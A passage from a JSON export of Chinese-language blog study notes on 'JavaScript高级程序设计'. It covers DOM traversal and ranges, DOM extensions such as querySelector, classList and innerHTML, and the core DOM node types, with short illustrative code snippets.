scrollWidth/scrollHeight用于确定元素内容的实际大小。而对不包含滚动条的情况下，此对属性与clientWidth/clientHeight关系有写混乱，不同浏览器有不同的值。所以确定文档的总大小时，一定要取这两对属性的最大值。 确定元素大小每个元素都有一个getBoundingClientRect方法，该方法返回一个矩形对象，包含4个值：left、top、right、bottom，表示元素在页面中相对视口的位置。 在IE8以下，文档左上角坐标初始值为(2,2) 遍历DOM2 Traversal and Range 遍历和范围模块定义的两个用于顺序遍历DOM结构的类型，NodeIterator和TreeWalker。这两个类型基于给定起点对DOM结构执行深度优先遍历。IE不支持。可参考JavaScript DOM2和DOM3——“遍历”的注意要点 NodeIteratorNodeIterator比较简单，通过document.createNodeIterator()方法可创建一个实例，该方法接受4个参数： root，作为起点的节点 whatToShow， 表示要访问那些节点的数字掩码， filter，是一个NodeFilter对象，表示接收还是拒绝某种特定节点的函数 entityReferenceExpansion，布尔值，表示是否要扩展实体引用。在HTML中无效。 NodeIterator类型有两个方法：nextNode和previousNode。 TreeWalkerTreeWalker是NodeIterator的高级版本，除了nextNode和previousNode类似的方法，还有 parentNode，当前遍历节点的父节点 firstChild，当前节点的第一个子节点 lastChild nextSibling，当前节点的下一个同辈节点 previousSibling 通过document.createTreeWalker()方法创建，且接收的参数与createNodeIterator相同。 范围通过范围（range）接口可选择文档中的一个区域，而不必考虑节点的界限（选择在后台完成，对用户不可见），在常规的DOM操作不能更有效修改文档时，可考虑使用范围接口。 使用非常少，略过 DOM中的范围DOM2在Document类型中定义了createRange方法。与节点类似，新创建的范围直接与创建它的文档关联在一起，不能用于其他文档。创建了范围后就可以使用它在后台选择文档中的特定部分。一个范围实例有如下属性和方法： startContainer，包含范围起点的节点（即选取中第一个节点的父节点） startOffset，范围在startContianer中起点的偏移量，若是文本/注释/CDATA节点则为文本偏移字符数。 endContainer endOffset commonAncestorContainer，startContainer和endContainer共同的最近祖先节点 简单选择通过selectNode和selectNodeContents方法可以选择一个节点（包含子节点）其所有子节点，参数为一个DOM节点。12345var rang1 = document.createRange();var rang2 = document.createRange();var div = document.getElementById('div');rang1.selectNode(div);rang2.selectNodeContents(div); 复杂选择使用setStart和setEnd方法，可创建复杂的范围。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-18-DOM扩展","slug":"js-pro18","date":"2016-08-25T06:49:14.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/25/js-pro18/","link":"","permalink":"https://github.com/xmoyKING/2016/08/25/js-pro18/","excerpt":"","text":"尽管DOM作为API已经非常完善，但为了实现更多的功能，仍然会有一些标准或专有的扩展，随后W3C将一些事实标准的专有扩展标准化并写入规范。 DOM的两个主要的扩展是Selectors API(选择符API)和HTML5，这两个扩展都来自开发社区，而将常见做法即API标准化是众望所归的。然后还有一个Element Traversal(元素遍历)规范，为DOM添加了一些属性。 选择符APIjs库中最常用的一项功能就是根据css选择符选择与某个模式匹配的DOM元素，jQuery的核心就是通过css选择符查询DOM文档取得元素的引用，从而抛弃了getElementById、getElementsByTagName。 Selectors API是由W3C发起制定的一个标准，致力于让浏览器原生支持CSS查询，所有实现这一功能的js库偶会写一个基础的css解析器，然后再使用已有的DOM方法查询文档并找到匹配的节点。当这个功能变成原生API后，解析和树查询操作可以在浏览器内部通过编译后的代码来完成，极大改善了性能。 Selectors API Level1的核心是两个方法：querySelector和querySelectorAll，在兼容的浏览器中，通过Document、Element类型实例可调用。 querySelector方法querySelector接收一个css选择符，并返回匹配的第一个元素，若没有找到则返回null 通过Document类型调用querySelector时，会在文档元素的范围内查找匹配的元素，而通过Element类型调用只会在该元素后代元素的范围内查找匹配的元素。 若传入不支持的选择符时，querySelector会报错。1var img = document.body.querySelector('img'); querySelectorAll方法querySelectorAll方法接收的参数和querySelector一样，都是一个css选择符，但返回的是一个NodeList实例。但这个NodeList实例没有动态查询的能力，所以其实只是一组元素的快照，这样是为了避免性能问题。 若没有找到匹配的元素则返回空。通过方括号或item方法可以遍历NodeList对象。 matchesSelector方法Selectors API 2级规范新添加了一个matchesSelectors方法在Element类型上，这个方法接收一个CSS选择符，若调用元素与该选择符匹配则返回true，否则返回false。在取得某个元素引用的情况下，该方法能够方便检测它是否被querySelector或querySelectorALl方法返回。此方法兼容性不高，使用需多注意。123if(document.body.matchesSelectors('body.page1'))&#123; // ...&#125; 元素遍历为了弥补IE与其他浏览器在处理元素间空格上的不一致（会影响到childNodes和firstChild等属性的使用），W3C新定义了一组属性，Element Traversal规范添加属性： childElementCount, 返回子元素（不包括文本节点和注释）个数 firstElementChild, 指向第一个子元素，firstChild的元素版 lastElementChild, 指向最后一个子元素，lastChild的元素版 previousElementSibling, 指向前一个同辈元素，previousSibling的元素版 nextElementSibling, 指向后一个同辈元素，nextSibling的元素版如此就可以忽略元素间的空白文本节点了。 HTML5HTML5之前的html规范主要用于定义标记，与js相关的内容一般是通过DOM规范定义。HTML5规范围绕如何使用新增标记定义了大量的js API，其中一些API与DOM重叠，定义了浏览器应该支持的DOM规范。 HTML5涉及面非常广，本部分只讨论与DOM相关的内容，同时需要注意这些方法或属性的兼容性。 与类相关的扩充HTML4中class属性用费非常多，一方面通过它为元素添加样式，另一方面用它表示元素语义，于是通过js来操作css类就非常频繁了，比如动态修改类或者搜索文档中具有给定类或给定的一组类的元素。HTML5新增了很多API致力于简化CSS类的使用。 getElementsByClassName方法H5添加的getElementsByClassName方法用的非常多，可以通过document对象及所有HTML元素调用此方法。该方法接收一个字符串，该字符串为类名。多个类名时顺序不重要。123var all = document.getElementsByClassName('username current');var selected = document.getElementById('mydiv').getElementsByClassName('selected'); 注：该方法与getElementsByTagName一样，返回的NodeList也有动态查找的能力，所以也有性能问题 classList属性在操作类名时需要通过className属性添加、删除、替换类名，因为className中是一个字符串，所以即使值修改字符串的一部分，也必须每次设置整个字符串的值。 H5新增了操作类名的方式，即为所有元素添加classList属性，该属性是新集合类型DOMTokenList的实例，与其他DOM集合类似，DOMTokenList有一个表示子元素数目的length属性，通过item方法或方括号语言可以取得每个元素。该DOMTokenList类型定义了如下方法： add(value) 将给定的value类名添加到列表中，如已存在则无效 contains(value) 查询是否已经存在value的类名，若存在返回true，否则返回false remove(value) 移除value类名 toggle(value) 若列表已存在value则移除，否则添加 焦点管理H5天年了辅助管理DOM焦点的功能，document.activeElement属性，这个属性始终会引用DOM中当前获得了焦点的元素，元素获得焦点的方式有页面加载、用户输入（tab键），以及通过代码调用focus方法。123var button = docment.getElementById('button');button.focus();document.activeElement === button; // true 默认情况下，文档加载期间document.activeELement的值为null，文档刚加载完成时是document.body元素的引用。 document.hasFocus()用于确定文档是否获取了焦点。即可知道用户是不是正在与页面交互，查询闻到那股获知那个元素获取了焦点，以及确定文档是否获得了焦点，这两个功能最重要的作用是提高Web引用的无障碍性，无障碍Web应用的一个主要标志就是恰当的焦点管理，而确切的知道那个元素获取了焦点是一个极大的进步。 主流浏览器都支持这两方法。 HTMLDocument的变化H5扩展了HTMLDocument，添加了一些新属性和方法。 readyState属性表示文档加载状态，有两个值，loading表示正在加载文档，complete表示文档加载完成。使用document.readyState来指示文档加载完成时执行的操作。 兼容模式自IE6开始区分渲染页面的模式是标准还是混杂时，检测页面的兼容模式就成为了浏览器的必要功能之一。IE为document添加了额compatMode的属性，标准模式下，该值为CSS1Compat,混杂模式下为BackCompat。后来该属性被纳入H5标准中。 head属性因document.body能引用body元素，从而H5补充了对head元素的引用，即document.head属性（也可以通过getElementsByTagName(‘head’)[0]获取）。 字符集属性H5新增了与字符集相关的属性，其中charset属性表示文档中实际使用的字符集，可以来指定新字符集，默认情况下，这个熟悉的值为utf-16，但通过meta元素、响应头、charset属性修改这个值。 另一个属性是defaultCharset，表示根据默认浏览器即操作系统的设置，当前文档默认的字符集。 自定义数据属性H5新添加了非标准的属性，即以前缀data-开始的自定义属性，用于为元素提供与渲染无关的信息，或提供语义信息，这些属性任意添加、命名。 添加了自定义属性后，可以通过元素的dataset属性来访问自定义属性值，dataset属性的值是DOMStringMap的一个实例，也就是键值对映射，每个data-name形式的属性都有一个对应的属性，属性名为去掉前缀后的值(比如自定义属性是data-myname，则对应的属性就是myname)。 若需要给元素添加一些不可见的数据以便进行其他处理，就可以使用自定义数据属性。 插入标记DOM为操作节点提供了很多方法，但在需要给文档插入大量新HTML标记的情况下，通过DOM操作非常繁琐，不仅要创建一系列DOM节点，而且需按正确顺序链接，而使用插入标记技术，则直接插入HTML字符串，不仅更简单，速度也更快。 innerHTML属性在读模式下，innerHTML属性返回与调用元素的所有子节点（包括元素、注释、文本节点）对应的HTML标记。在写模式下，innerHTML能根据指定的值创建新的DOM树，然后用这个DOM树完全替换调用元素原先的所有子节点。 但不同浏览器返回的文本格式有区别，比如IE和Opera会将标签转换为大写，而Safari、Chrome、Firefox则按元文档返回，包含空格和缩进。 在写模式下，innerHTML的值会被解析为DOM子树，替换调用元素原来的所有子节点，由于值被认为是HTML，所以其中所有的标签都会按照浏览器处理HTML的标准方式转换为元素（浏览器之间有差异）。 但也有限制，大多数浏览器下，innerHTML插入的script标签不会执行其中的脚本。（在IE8及更早版本中有特殊的处理方法：需要理解所谓的“无作用域元素”，对style标签也一样。），除了IE&lt;8，style元素的插入可以生效。 outerHTML属性在读模式下，outerHTML返回调用它的元素及其所有子节点的HTML标签，在写模式下，outerHTML会根据指定的HTML字符串创建新的DOM子树，然后用这个DOM子树完全替代调用元素。 inserAdjacentHTML方法该方法接收两个参数，第一个是一个表示插入位置的字符串，第二个是要插入的HTML文本。第一个参数的值类型为： ‘beforebegin’ 在当前元素之前插入一个同辈元素 ‘afterbegin’ 在当前元素下插入/第一个子元素之前插入一个子元素 ‘beforeend’ 在当前元素下插入/在最后一个子元素之后插入一个子元素 ‘afterend’ 在当前元素之后插入一个同辈元素 第二个参数是HTML字符串（与innerHTML、outerHTML相同类型）。 内存与性能问题innerHTML、outerHTML、insertAjacentHTML提供了很多遍历，但以上的插入标记的方法可能会导致浏览器的内存占用问题（尤其是IE中）。 在删除带有事件处理程序或引用其他js的对象子树时，就有可能导致内存占用问题，比如某元素有一个事件处理程序（或引用了一个js对象作为属性），在使用前面的某个方法或属性将该元素从文档树中删除后，元素和事件处理程序（或js对象）之间的绑定关系在内存中并没有一并删除。如此情况频繁出现的话，页面占用的内存会非常多。因此在使用innerHTML、outerHTML、insertAjacentHTML时需要先手动删除被替换的元素的所有事件处理程序和js对象属性。 scrollIntoView方法如何滚动页面是DOM1规范没有解决的问题之一，H5最后定义了scrollIntoView方法作为标准方法。 scrollIntoView可以在所有HTML元素上调用，通过滚动浏览器窗口或某个容易元素、调用元素就可以出现在视口中，若给这个方法传入true作为参数，则不传任何参数，那么窗口滚动之后会让调用元素的顶部与视口顶部尽可能平齐，若传入false作为参数，则会将调用元素尽可能全部出现在视口中（即底部平齐）。 事实上，为某元素设置焦点也会导致浏览器滚动并显示出获取焦点的元素。 专有扩展虽然浏览器厂商大都坚持标准，但当发现标准中某项功能缺失时，还是会向DOM中添加专有扩展。这些专有扩展在将来可能会在H5规范中得到标准化。 所以有很多专有的DOM扩展没有被标准化但依然会有用。 文档模式，自IE8引入的概念，页面的文档模式决定可使用什么功能，即，文档模式决定了可以使用那个级别的CSS，可在js中使用那些API，以及如何对待文档类型。浏览器模式与文档模式区别、JS魔法堂：浏览器模式和文档模式怎么玩？ children属性，该属性弥补了IE9之前版本与其他浏览器处理文本节点中空白符的差异，使用此属性统一只处理子元素（不包括注释和空白文本节点） contains方法，该方法用于确定某节点是不是另一个节点的后代，该方法返回一个布尔值。使用DOM3的compareDocumentPostition也可确定节点间的关系，此方法返回一个表示关系的掩码（bitmask）： 1 无关，给定的节点不在文档中 2 居前，给定节点在DOM树中位于参考节点前 4 居后 8 包含，给定节点是参考节点的祖先 16 被包含，给定节点是参考节点的后代 插入文本，IE还有2个未被标准化的属性，innerText和outerText，其中innerText的行为与jquery的text()方法类似。outerText会扩大到调用它的节点。 滚动，在H5之前并没有与页面滚动相关的API。在有了scrollIntoView之后，Safari和Chrome也相继对HTMLElement类型扩展了几个方法： scrollIntoViewIfNeeded(alignCenter),只有当前元素在视口中不可见的情况下，才滚动浏览器窗口或容器元素，最终让它可见。若当前元素在视口中可见，则忽略。若将alignCenter设为true，则尽量将元素显示在视口中部。 scrollByLines(lineCount), 将元素的内容滚动指定的行数，lineCount可正可负。 scrollByPages(pageCount), 将元素的内容滚动到指定的页面高度，具体高度由元素的高度决定。其中，scrollIntoView和scrollIntoViewIfNeeded的作用对象是元素容器，scrollByLines和scrollByPages影响的是元素自身。 随着Web发展，DOM扩展的数目会越来与多，而浏览器的专有扩展一旦成为事实标准则很可能会被标准化到规范中。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-17-DOM","slug":"js-pro17","date":"2016-08-20T06:25:36.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/20/js-pro17/","link":"","permalink":"https://github.com/xmoyKING/2016/08/20/js-pro17/","excerpt":"","text":"DOM（文档对象模型）是针对HTML和XML文档的一个API，DOM描述了一个层次化的节点树，允许添加、移除、修改页面中的一部分。DOM已经成为表现和操作页面标记的真正跨平台、语言中立的方式。 W3C定义的DOM1规范为基本的文档结构及查询提供了接口，本章主要讨论浏览器中HTML页面相关的DOM1级特性和应用，以及js对DOM1级的实现。 IE中的所有DOM对象都以COM对象的形式实现，所以IE中的DOM对象与原生js对象的行为或特点不一致 节点层次DOM可以将任何HTML和XML文档描述成一个多层次节点构成的结构，节点分为几种不同的类型，每种类型分别表示文档中不同的信息及标记。每个节点都拥有各自的特点、数据、方法，另外也与其他节点存在关系。节点之间的关系构成了层次，而所有的页面标记则表现为一个以特定节点为根节点的树形结构。123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;link href=\"css/style.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 文档节点是每个文档的根节点，文档节点只有一个子节点，即&lt;html&gt;元素，称为文档元素,文档元素是文档的最外层元素，文档中的其他所有元素都包含在文档元素中，每个文档只能有一个文档元素，在HTML页面中，文档元素始终是&lt;html&gt;元素。在XML中，没有预定义的元素，因此任何元素都能成为文档元素。 每一段标记都可以通过树中的一个节点来表示：HTML元素通过元素节点表示，特性（attribute）通过特性节点表示，文档类型通过文档类型节点表示，而注释则通过注释节点表示，总共有12种节点类型，这些节点类型都继承自一个基类型。 Node类型DOM1级定义了一个Node接口，该接口将由DOM中的所有节点类型实现。这个Node接口在js是作为Node类型实现的，除了IE之外，在其他所有浏览器中都可以访问到这个类型。js中的所有节点类型都继承自Node类型，因此所有节点类型都共享相同的基本属性和方法。 每个节点都有一个nodeType属性，用于表明节点的类型，节点类型由在Node类型中定义的12个数值常量来表示，任何节点类型必是其一。nodeType NodeType Named Constant 1 ELEMENT_NODE 2 ATTRIBUTE_NODE 3 TEXT_NODE 4 CDATA_SECTION_NODE 5 ENTITY_REFERENCE_NODE 6 ENTITY_NODE 7 PROCESSING_INSTRUCTION_NODE 8 COMMENT_NODE 9 DOCUMENT_NODE 10 DOCUMENT_TYPE_NODE 11 DOCUMENT_FRAGMENT_NODE 12 NOTATION_NODE 比较常量，就可以知道节点的类型：1someNode.nodeType == Node.ELEMENT_NODE; // IE中无法使用Node常量值，只能使用数字 1 nodeName和nodeValue属性通过nodeName和nodeValue属性可以了解节点的具体信息，每种节点的值都不同。比如，对于元素节点nodeName保存元素的标签名，nodeValue为null。 节点关系文档中所有的节点之间都存在联系，节点间的各种关系可以用传统的家族关系来描述，相当于把文档树看作家谱。在HTML中，body元素是html元素的子元素，相应的html元素就是body元素的父元素，head元素则是body元素的同胞元素，它们都是html元素的直接子元素。 每个节点都有一个childNodes属性，保存着一个NodeList对象，NodeList是一种类数组对象，用于保存一组有序的节点，可以通过位置来访问这些节点。NodeList对象的特点是它实际上是基于DOM结构动态执行查询的结果，因此DOM结构的变化能够自动反映到NodeList对象中。 NodeList中的节点可以通过方括号，也可以通过item方法访问：123var firstChild = someNode.childNodes[0];var secondChild = someNode.childNodes.item(1);var count = someNode.childNodes.length; 每个节点都有一个parentNode属性，该属性指向文档书中的父节点，包含在childNodes列表中的所有节点都具有相同的父节点。同时相互之间是同胞节点，可以通过previousSibling和nextSibling属性访问。若无前/后同胞节点，则属性值为null。firstChild和lastChild属性也非常方便。ownerDocument属性指向整个文档的文档节点，任何节点都不能同时存在多个文档中，所以可以直接访问文档节点。 同时还有hasChildNodes方法能查询是否有子节点、虽然节点类型都继承自Node，但并不是每种节点都有子节点。 操作节点因为关系指针都是只读的，所以DOM提供了一些操作节点的方法，比如appenChild方法用于向childNodes列表的末尾添加一个节点，添加节点后，childNodes的所有节点关系指针都会更新，更新完成后，appendChild方法返回新增的节点。 但若appendChild接收的是一个已经存在于文档中的节点则会将该节点从原来的位置转移到新位置。 若要把节点放在childNodes列表中某个特定的位置上，而不是放在末尾，那么可以使用insertBefore方法，该方法接收两个参数，要插入的节点和作为参照的节点，插入节点后，被插入节点会变成参照节点的前一个同胞节点(previousSibling),同时被方法返回。若参照节点是null，则insertBefore和appendChild结果相同。 replaceChild方法能将节点替换为指定节点，接收两个参数：要插入的节点和要替换的节点，方法返回要替换的节点。 移除节点用removeChild方法，该方法接收将要移除的节点。 以上的4个方法都是某节点的方法，所以使用前一定要知道其父节点，若在不支持子节点的节点上调用方法则会报错。同时，被移除和替换的节点理论上仍然归文档所有，但是却没有在文档中占有一个位置。 其他方法两个公用的方法是节点都有的，cloneNode用于创建调用这个方法的节点的一个副本，接收一个布尔参数表示是否要深度复制，在参数为true的情况下，执行深度复制会包含节点本身及整个子节点树，而浅复制则只复制节点本身。 新的副本节点属于文档，但却没有指定父节点，所以需要使用appendChild、insertBefore、replaceChild等方法将它添加到文档中。 cloneNode方法不会复制添加到DOM节点上的js事件绑定，这个方法只复制特性、子节点（可选）。 第二个公用方法是normailze，该方法的作用是处理文档树中的文本节点，由于解析器的实现或DOM操作等原因吗，可能会出现文本节点不包含文本，或者接连出现多个文本节点，当某个节点上调用此方法时，就会在该节点的后代节点中查找上述特别的情况，若找到空文本节点，则删除它，若找到相邻的文本节点则合并它们。 Document类型js通过Document类型表示文档，在浏览器中，document对象是HTMLDocument（继承自Document类型）的一个实例，表示整个HTML页面，而且，document对象是window对象的一个属性，因此可以将其作为全局对象来访问。Document节点的特征如下： noteType值为9 nodeName值为”#document” nodeValue、parentNode、ownerDocument值为null 其子节点可能是一个DocumentType/Element/ProcessingInstruction/CommentDocument类型可以表示HTML页面或其他基于XML的文档，不过最常见的还是作为HTMLDOcument实例的document对象，通过document对象可以取得与页面有关的信息，而且还能操作页面的外观及底层结构。 文档的子节点有两个内置的访问Document子节点的快捷方式，第一个就是doucmentElement属性，该属性始终指向HTML页面中html元素，另一个就是通过childNodes列表访问文档元素，但前者更快更直接。 比如如下页面12345&lt;html&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 浏览器解析后，其文档中只包含一个子节点，即html元素，可以通过documentElement和childNodes列表来访问这个元素：123var html = document.documentElement; // 取得对&lt;html&gt;的引用html === document.childNodes[0]; // truehtml === document.firstChild; // true 作为HTMLDocument的实例，document对象还有一个body属性，直接指向body元素。 Document另一个可能的子节点是DocumentType，通过将&lt;!DOCTYPE&gt;标签看作是一个与文档其他部分不同的实体，可以通过doctype属性（document.doctype）获取。浏览器对doctype的支持差别很大，有的浏览器将其当做注释，有的返回null。 同时从技术上说，出现在html元素外的注释应该也算是文档的子节点，但浏览器之间对其也存在差异。 在多数情况下，在document对象上调用appendChild、removeChild、replaceChild方法都是无效的，因为文档类型是只读的，只能有一个元素子节点且早已存在。 文档信息document对象有一些标准Document类型所没有是属性，比如title属性，即页面标题，包含了title元素中的文本。修改title属性能立即更新页面的标题但不会修改title元素内容。 还有3个与网页请求有关的属性，分别是URL、domain、referrer，URL属性包含页面完整的URL、domain属性只包含域名，referrer则保存着链接到当前页面的来源页面的URL，若没有来源则可能为空字符串。 三个属性中只有domain是可设置，但由于安全限制，若URL包含一个二级域名则domain只能设置为一级域名。domian的用处主要是当页面包含来自其他子域的框架或内嵌框架时，能够设置其domain属性为相同的值，这样不同子域的页面就可以互相访问对方的js对象了。比如一级域名网页内包含一个二级域名子框架，那么由于两个页面的domain值不同，无法直接通信，但将domian属性都设置为一级域名后，则可以访问了。 同时将一个domain设置为一级域名后就无法设置为二级域名，即无法继续向下设置为更下的域名，只能向上设置。 查找元素查找特定元素或某组元素的引用是最常用的操作，document对象提供的getElementById和getElementsByTagName非常有用。 getElementById根据元素的id属性来查找，返回指定元素的引用。而getElementsByTagName根据标签名返回指定元素集的引用，而且是一个动态HTMLCollection对象集合，而且返回的HTMLCollection对象还有一个namedItem方法能根据特定元素的name属性值取得集合中的项，也可以通过名称索引来访问，默认返回第一个匹配项。1234567// &lt;div id=\"myDiv\"&gt;&lt;/div&gt;var div = document.getElementById('myDiv');// &lt;img name=\"myImage\" src=\"...\"/&gt;var images = document.getElementsByTagName('img');images.namedItem('myImage');images['myImage']; // 效果同namedItem 对一个HTMLCollection而言，向方括号中传入数值或字符串形式的索引值时，在背后对数值会调用item方法，对字符串索引调用namedItem方法。 若给一个getElementsByTagName方法传入星号字符串&#39;*&#39;则会返回整个页面的所有元素，按照它们出现的先后顺序，比如一般情况下，第一个是html元素，第二个是head元素,… 在IE中会将注释当做一个元素，所以也会返回所有注释节点。 document对象还有一个只有HTMLDocument类型才有的方法，getElementsByName,根据name取得元素，一般用在获取单选按钮，因为一组单选按钮的name属性必须相同。其返回的也是一个HTMLCollection对象。 特殊集合除了属性和方法，document对象还有一些特殊的集合，这些集合也都是HTMLCollection对象，包括 document.anchors， 所有文档中带name属性的a元素 document.applets，所有applet元素，但由于applet元素的废弃，所以基本不会用到 document.forms, 所有form元素 document.images, 所有img元素 document.links，所有带href属性的a元素 DOM一致性检测由于DOM分为多个级别，也包含多个部分，因此检测浏览器实现了DOM的那些部分就很有用了，document.implementation属性就是谓词提供相应信息和功能的对象，与浏览器对DOM的实现直接对应。DOM1级只为document.implementation规定了一个方法，即hasFeatures方法，这个方法接收2个参数:要检测的DOM功能名称和版本号。若支持则返回true。 实际一般不会单独使用hasFeatures方法检测浏览器提供的DOM功能，因为浏览器会自行实现这些DOM功能，所以最好搭配能力检测一起使用。 文档写入将输出流写入到网页的几个方法有着很长的历史，主要是write、writeln、open、close四个方。 其中write/writeln接收一个字符串参数，表示写入到输出流的文本。write会原样写入，writeln会在字符串末尾添加一个换行符(\\n),在页面被加载的过程中，可以使用这两个方法向页面中动态的加入内容。也可以将script标签写入到页面以此来动态包含外部资源，但需要注意的是若直接在页面script标签中写这段代码，需要将字符串中的&lt;/script&gt;转义，否则会被视作script标签结尾：123&lt;script&gt; document.write('&lt;script src=\"...\"&gt;&lt;\\/scipt&gt;');&lt;/script&gt; 若在页面的内容加载完成后在调用write方法，则输出内容将重写已加载的页面。 方法open/close则用于打开和关闭页面的输出流，若实在页面加载期间使用write/writeln方法则不需要使用这两个方法。 Element类型Element类型用于表现XML或HTML元素，提供对元素标签名、子节点及特性的访问，Element节点具有如下特性： nodeType值为1 nodeName值为元素标签名，也可以使用tagName属性 nodeValue值为null parentNode可能是Document或Element 子节点类型可能是Element、Text、Comment、ProcessingInstruction、CDATASection、EntityReference HTML元素所有HTML元素都由HTMLElement类型表示，HTMLElement类型直接继承自Element，并添加了一些所有html元素都公有的标准属性： id, 元素在文档中的唯一标识符 title，有关元素的附加说明信息 lang，元素内容的语言代码，很少使用 dir，语言的方向，值为ltr（left-to-right）或rtl(right-to-left)，很少使用 className，与元素的class属性对应，之所以是驼峰命名格式是因为class是ES的保留字修改上述属性会立即更新到页面上。 获取属性操作属性的DOM方法主要有3个：getAttribute、setAttribute、removeAttribute。 但元素上有两类特殊的属性需要注意：一个是style属性，通过getAttribute(&#39;style&#39;)访问会返回属性值中的CSS文本，而通过css属性则返回一个对象。还有一个则是onclick这类js事件处理程序，由于其属性值一般是js代码，所以通过getAttribute(&#39;onclick&#39;)访问会返回一个字符串，而访问onclick属性时会返回js函数（未指定则返回null）。 所以，一般情况下，通过js以编程方式操作js时使用对象属性，而不是getAttribute方法。只有在获取自定义属性时（以data-开头的属性）才使用getAttribute方法。 设置属性与getAttribute对应的方法是setAttribute，这个方法接受两个参数：要设置的属性名和值，若属性值存在则替换，若不存在则新增。 通过这个setAttribute方法即可以操作HTML标准属性也可以操作自定义属性，同时通过这个方法设置的属性名会被统一转换为小写形式，即“ID”最终会变为“id”。 同时，由于HTML标准属性值的特殊性，直接给属性赋值也可以设置属性的值，但自定义的属性值不会自动成为元素属性。1234div.id = 'someId'。div.mycolor = 'red';div.getAttribute('mycolor'); // null removeAttribute方法能彻底删除元素的属性。此方法一般是用做序列化DOM元素，通过它来删除非指定的属性。1div.removeAttribute('class'); attributes属性Element类型是使用attributes属性的唯一一个DOM节点类型，attributes属性中包含一个NamedNodeMap，与NodeList类似，也是一个动态的集合，元素的每一个属性都由一个Attr节点表示，每个节点都保存在NamedNodeMap对象中。NamedNodeMap对象拥有如下方法： getNamedItem(name) 返回nodeNade属性等于name的节点 removeNameItem(name) 从列表中删除nodeNamde属性等于namde的节点 setNameItem(node) 向列表中添加节点，以节点的nodeName属性为索引 item(pos) 返回位于pos位置处的节点attributes属性中包含一系列节点，每个节点的nodeName就是属性的名称，而节点的nodeValue就是属性值，比如取得元素的id属性：1234var id = element.attributes.getNamedItem('id').nodeValue;var id = element.attributes['id'].nodeValue; // 等效element.attributes['id'].nodeValue = 'something'; // 设置为新值 一般来说，除了在遍历元素的属性之外，多用getAttribute、setAttribute、removeAttribute。 创建元素使用document.createElement方法可以创建新元素，这个方法只接收一个表示创建元素的标签名作为参数，同时在HTML文档中，这个参数不区分大小写，但XML中区分。 使用createElement方法创建新元素的同时，也为新元素设置了ownerDocument属性，此时可以操作元素的属性，为其添加更多子节点或执行其他操作, 但设置了这些值仅仅只是在内存中赋予了相应的信息，而新元素没有被添加到文档树中，因此这些属性此时不会影响浏览器的显示。可使用appendChild、insertBefore、replaceChild方法将新元素插入到文档树中。 一旦将元素添加到文档树中后，浏览器就会立即渲染该元素，此后对该元素的任何修改都会反映到浏览器中。123456var div = document.createElement('div');div.id = 'myDiv';div.className = 'box';document.body.appendChild(div); 元素的子节点元素可以有任意数目的子节点和后代节点，因为元素可以是其他元素的子节点，元素的childNodes属性中包含了它所有子节点，这些子节点可以是元素，文本节点，注释，甚至处理指令。 不同浏览器在处理这些节点上存在差异。比如：12345&lt;ul class=\"list\"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt;&lt;/ul&gt; IE解析时会认为ul元素有3个子节点，分别是3个li元素，而其他浏览器会认为ul有7个元素，包括3个li元素和4个文本节点，因为li与li和ul之间的空白符，若将这些空白符删除则数目相同。 因此使用childNodes时，必须注意子节点的数目差异，同时需要检查nodeType属性。 有的时候若需要获取元素的特定子元素时可以通过调用元素的getElementsByTagName方法，通过元素调用该方法时搜索起点是当前元素，因此只返回当前元素的后代（不仅仅是直系子节点，也包含嵌套的子节点）。 Tex类型文本节点由Text类型表示，包含的是可以照字面解释的纯文本内容，不包含HTML代码，但可以是转义后的HTML字符。具有如下特定： nodeType为3 nodeName为”#text” nodeValue为节点所包含的文本 parentNode是一个Element 不支持子节点可通过nodeValue/data属性访问Text节点中包含的文本，这两个属性中包含的值相同，nodeValue/data相互映射，length属性保存节点中字符的数目，即：nodeValue.length和data.length相同。下列是其他可操作的方法： appendData(text) 将text添加到节点的末尾 deleteData(offset, count) 从offset指定的位置开始删除count个字符 insertData(offset, text) 从offset出开始插入text replaceData(offset, count, text) 用text替代从offset位置开始到offset+count为止的文本。 splitText(offset) 从offset处将文本节点分为两个文本节点 substringData(offset, count) 提取从offset开始到offset+count为止的字符串默认情况下，若一个可包含内容的元素（如div）必须有内容存在时才有文本节点，且最多只能有一个文本节点。 同时修改文本节点时字符串会进行HTML编码，即大于、小于、引号会被转义,准确的说其实是在向DOM插入文本之前会对其插入内容进行HTML编码：12div.firstChild.nodeValue = 'come &lt;strong&gt; HERE &lt;/strong&gt;!';// 会被转义为 come &amp;lt;strong&amp;gt; HERE &amp;lt;/strong&amp;gt;! 创建文本节点使用document.createTextNode()可以创建新的文本节点，作为参数的文本将按照HTML编码。 在创建新文本节点的同时，也会为其设置ownerDocument属性，同时需要将文本节点插入到文档树中否则无法在浏览器看到。 当向同一个元素插入多个文本节点后，相邻的文本会连起来显示（仅仅是显示上）。 规范化文本节点当DOM文档中存在相邻的同胞文本节点很容易导致混乱，因为无法分清文本节点表示的字符串。所以需要一个将相邻文本节点合并的方法，该方法定义在Node类型中，所以所有的节点类型都存在，名为normalize。 浏览器在解析文档时永不会创建相邻的文本节点，所以使用normalize的情况只会执行DOM操作时使用。 分割文本节点而splitText方法就是与normalize方法相反的操作，将一个文本节点分割为2个文本节点，该方法返回一个新的文本节点。此方法常用于从文本节点中提取数据。 